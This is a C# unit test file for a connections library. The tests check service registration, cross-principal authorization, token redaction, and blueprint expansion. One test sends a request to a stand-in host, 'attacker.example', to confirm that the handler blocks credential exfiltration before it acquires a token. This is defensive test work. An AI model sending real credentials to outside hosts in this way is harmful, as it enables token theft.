using System.Text.Json;
using FabrCore.Connections;
using FabrCore.Core;
using FabrCore.Core.Blueprints;
using Microsoft.Extensions.DependencyInjection;

namespace FabrCore.Services.Connections.Tests;

[TestClass]
public sealed class ConnectionTests
{
    [TestMethod]
    public void DisabledRegistrationHasNoProviderOrWorkers()
    {
        var services = new ServiceCollection();
        services.AddFabrCoreConnections(o => o.Enabled = false);
        Assert.AreEqual(0, services.Count);
    }
    [TestMethod]
    public void EnabledRegistersHostProtectionWithoutAnAssertionFlag()
    {
        var services = new ServiceCollection();
        services.AddFabrCoreConnections(o => o.Enabled = true);
        Assert.IsTrue(services.Any(d => d.ServiceType == typeof(FabrCore.Host.Security.IFabrCoreDataProtectionProvider)));
    }
    [TestMethod]
    public void DelegatedConnectionsCannotBeBorrowedAcrossPrincipals()
    {
        var p = new ConnectionProfile { Authentication = ConnectionAuthentication.AuthorizationCode, AllowedAgents = ["bob:agent"] };
        Assert.ThrowsExactly<ConnectionException>(() => ConnectionGrain.Authorize(p, "alice", "bob", "bob:agent"));
    }
    [TestMethod]
    public void ServiceConnectionsRequireExplicitAgentGrant()
    {
        var p = new ConnectionProfile { Authentication = ConnectionAuthentication.ClientCredentials, AllowedAgents = ["alice:agent"] };
        ConnectionGrain.Authorize(p, "mail-service", "alice", "alice:agent");
        Assert.ThrowsExactly<ConnectionException>(() => ConnectionGrain.Authorize(p, "mail-service", "bob", "bob:agent"));
    }
    [TestMethod]
    public void TokensCannotLeakThroughJsonOrToString()
    {
        var token = new ConnectionAccessToken("sensitive-token", DateTimeOffset.UtcNow);
        Assert.IsFalse(JsonSerializer.Serialize(token).Contains("sensitive-token"));
        Assert.IsFalse(token.ToString().Contains("sensitive-token"));
        Assert.IsFalse(new ConnectionAssertionRequest("work", "sensitive-token").ToString().Contains("sensitive-token"));
        Assert.IsFalse(new CompleteConnectionRequest("work", "state", "sensitive-token").ToString().Contains("sensitive-token"));
    }
    [TestMethod]
    public async Task HandlerRejectsCredentialExfiltrationBeforeAcquiringToken()
    {
        var called = false;
        using var client = new HttpClient(new ConnectionHandler(new Uri("https://graph.microsoft.com/v1.0/"), _ => {
            called = true; return Task.FromResult(new ConnectionAccessToken("secret", DateTimeOffset.UtcNow.AddHours(1)));
        }));
        await Assert.ThrowsExactlyAsync<ConnectionException>(() => client.GetAsync("https://attacker.example/"));
        await Assert.ThrowsExactlyAsync<ConnectionException>(() => client.GetAsync("https://graph.microsoft.com/beta/"));
        Assert.IsFalse(called);
    }
    [TestMethod]
    public async Task BlueprintExpansionIsPortableAndDoesNotMutateSource()
    {
        var extension = JsonSerializer.SerializeToElement(new {
            connections = new { work = new ConnectionBinding("$principal", "work") },
            agents = new[] { new AgentConfiguration { Handle = "assistant", AgentType = "agent" } }
        }, JsonSerializerOptions.Web);
        var expander = new ConnectionBlueprintExpander();
        var alice = await expander.ExpandAsync(new() { PrincipalId = "alice", Blueprint = new FabrCoreBlueprint() }, extension);
        var bob = await expander.ExpandAsync(new() { PrincipalId = "bob", Blueprint = new FabrCoreBlueprint() }, extension);
        StringAssert.Contains(alice.Agents[0].Args["connections"], "alice");
        StringAssert.Contains(bob.Agents[0].Args["connections"], "bob");
        StringAssert.Contains(extension.GetRawText(), "$principal");
    }
}
